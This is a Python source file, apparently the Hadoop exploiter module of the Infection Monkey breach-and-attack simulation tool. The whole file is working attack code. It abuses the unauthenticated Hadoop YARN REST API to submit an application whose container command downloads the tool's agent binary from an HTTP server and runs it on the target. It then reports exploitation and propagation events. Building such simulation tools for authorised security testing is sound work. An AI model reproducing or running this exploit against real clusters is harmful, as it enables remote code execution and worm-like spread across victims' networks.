import json
import logging
import posixpath
import string
from datetime import datetime
from time import time
from typing import Sequence, Tuple
from uuid import UUID

import requests

from common import OperatingSystem
from common.agent_events import ExploitationEvent, PropagationEvent
from common.event_queue import IAgentEventPublisher
from common.tags import (
    T1105_ATTACK_TECHNIQUE_TAG,
    T1203_ATTACK_TECHNIQUE_TAG,
    T1210_ATTACK_TECHNIQUE_TAG,
)
from common.types import Event
from common.utils.code_utils import insecure_generate_random_string
from infection_monkey.exploit import IAgentBinaryRepository
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.exploit.tools.http_tools import HTTPTools
from infection_monkey.exploit.tools.web_tools import build_urls
from infection_monkey.i_puppet import ExploiterResultData
from infection_monkey.model import (
    HADOOP_LINUX_COMMAND,
    HADOOP_WINDOWS_COMMAND,
    MONKEY_ARG,
    TargetHost,
)
from infection_monkey.utils.commands import build_monkey_commandline

from .hadoop_options import HadoopOptions

logger = logging.getLogger(__name__)
HADOOP_EXPLOITER_TAG = "hadoop-exploiter"


class ExploitInfoMixin:
    """ """

    def set_start_time(self):
        self.exploit_info["started"] = datetime.now().isoformat()

    def set_finish_time(self):
        self.exploit_info["finished"] = datetime.now().isoformat()

    def add_vuln_url(self, url):
        self.exploit_info["vulnerable_urls"].append(url)

    def add_executed_cmd(self, cmd):
        """
        Appends command to exploiter's info.
        :param cmd: String of executed command. e.g. 'echo Example'
        """
        powershell = True if "powershell" in cmd.lower() else False
        self.exploit_info["executed_cmds"].append({"cmd": cmd, "powershell": powershell})


class Hadoop(ExploitInfoMixin):
    _EXPLOITED_SERVICE = "Hadoop"
    NAME = "HadoopExploiter"
    # Random string's length that's used for creating unique app name
    RAN_STR_LEN = 6

    _EXPLOITER_TAGS = (HADOOP_EXPLOITER_TAG, T1203_ATTACK_TECHNIQUE_TAG, T1210_ATTACK_TECHNIQUE_TAG)
    _PROPAGATION_TAGS = (HADOOP_EXPLOITER_TAG, T1105_ATTACK_TECHNIQUE_TAG)

    def __init__(
        self,
        host: TargetHost,
        options: HadoopOptions,
        interrupt: Event,
        agent_id: UUID,
        agent_event_publisher: IAgentEventPublisher,
        agent_binary_repository: IAgentBinaryRepository,
        servers: Sequence[str],
        current_depth: int,
    ):
        self._host = host
        self._options = options
        self._interrupt = interrupt
        self._agent_id = agent_id
        self._agent_event_publisher = agent_event_publisher
        self._agent_binary_repository = agent_binary_repository
        self.exploit_result = ExploiterResultData()
        self.exploit_info = {
            "display_name": self._EXPLOITED_SERVICE,
            "started": "",
            "finished": "",
            "vulnerable_urls": [],
            "vulnerable_ports": [],
            "executed_cmds": [],
        }
        self.servers = servers
        self.current_depth = current_depth

    def exploit_host(self):
        self._pre_exploit()
        try:
            return self.exploit_urls()
        except Exception as e:
            logger.error("Exception in run", exc_info=True)
            raise e
        finally:
            self._post_exploit()

    def _pre_exploit(self):
        self.exploit_result = ExploiterResultData(
            os=self._host.operating_system, info=self.exploit_info
        )
        self.set_start_time()

    def _post_exploit(self):
        self.set_finish_time()

    def exploit_urls(self):
        """
        Attempt to exploit on all URLs
        """

        # Try to get potential urls
        potential_urls = build_urls(
            str(self._host.ip), [(str(p), False) for p in self._options.target_ports]
        )
        if not potential_urls:
            self.exploit_result.error_message = (
                f"No potential exploitable urls has been found for {self._host}"
            )
            return self.exploit_result

        monkey_path_on_victim = get_agent_dst_path(self._host)

        http_path, http_thread = HTTPTools.create_locked_transfer(
            self._host, self._agent_binary_repository
        )
        if http_thread is None:
            return self.exploit_result

        command = self._build_command(monkey_path_on_victim, http_path)
        try:
            for url in potential_urls:
                if self.exploit(url, command):
                    self.add_executed_cmd(command)
                    self.exploit_result.exploitation_success = True
                    self.exploit_result.propagation_success = True
                    break
        finally:
            if self.exploit_result.exploitation_success:
                http_thread.join(self._options.agent_binary_download_timeout)
            http_thread.stop()

        return self.exploit_result

    def _build_command(self, path, http_path):
        # Build command to execute
        monkey_cmd = build_monkey_commandline(self.servers, self.current_depth + 1)
        if OperatingSystem.WINDOWS == self._host.operating_system:
            base_command = HADOOP_WINDOWS_COMMAND
        else:
            base_command = HADOOP_LINUX_COMMAND

        return base_command % {
            "monkey_path": path,
            "http_path": http_path,
            "monkey_type": MONKEY_ARG,
            "parameters": monkey_cmd,
        }

    def exploit(self, url: str, command: str) -> bool:
        """
        A reference to a method which implements web exploit logic.

        :param url: Url to send malicious packet to. Format: [http/https]://ip:port/extension.
        :param command: Command which will be executed on remote host
        :return: RCE's output/True if successful or False if failed
        """
        if self._interrupt.is_set():
            return False

        try:
            # Get the newly created application id
            timestamp = time()
            resp = requests.post(
                posixpath.join(url, "ws/v1/cluster/apps/new-application"),
                timeout=self._options.request_timeout,
            )
            resp_dict = json.loads(resp.content)
            app_id = resp_dict["application-id"]

            # Create a random name for our application in YARN
            # Avoid the risk of blocking by using insecure_generate_random_string()
            rand_name = self._options.yarn_application_suffix + insecure_generate_random_string(
                n=self.RAN_STR_LEN, character_set=string.ascii_lowercase
            )
            payload = Hadoop._build_payload(app_id, rand_name, command)

            if self._interrupt.is_set():
                return False

            timestamp = time()
            resp = requests.post(
                posixpath.join(url, "ws/v1/cluster/apps/"),
                json=payload,
                timeout=self._options.request_timeout,
            )

            success = resp.status_code == 202
        except requests.ConnectionError:
            success = False

        message = "" if success else f"Failed to exploit via {url}"
        self._publish_exploitation_event(timestamp, success, error_message=message)
        self._publish_propagation_event(timestamp, success, error_message=message)
        return success

    @staticmethod
    def _build_payload(app_id, name, command):
        payload = {
            "application-id": app_id,
            "application-name": name,
            "am-container-spec": {
                "commands": {
                    "command": command,
                }
            },
            "application-type": "YARN",
        }
        return payload

    def _publish_exploitation_event(
        self,
        time: float = time(),
        success: bool = False,
        tags: Tuple[str, ...] = tuple(),
        error_message: str = "",
    ):
        exploitation_event = ExploitationEvent(
            source=self._agent_id,
            target=self._host.ip,
            success=success,
            exploiter_name=self.NAME,
            error_message=error_message,
            timestamp=time,
            tags=frozenset(tags or self._EXPLOITER_TAGS),
        )
        self._agent_event_publisher.publish(exploitation_event)

    def _publish_propagation_event(
        self,
        time: float = time(),
        success: bool = False,
        tags: Tuple[str, ...] = tuple(),
        error_message: str = "",
    ):
        propagation_event = PropagationEvent(
            source=self._agent_id,
            target=self._host.ip,
            success=success,
            exploiter_name=self.NAME,
            error_message=error_message,
            timestamp=time,
            tags=frozenset(tags or self._PROPAGATION_TAGS),
        )
        self._agent_event_publisher.publish(propagation_event)
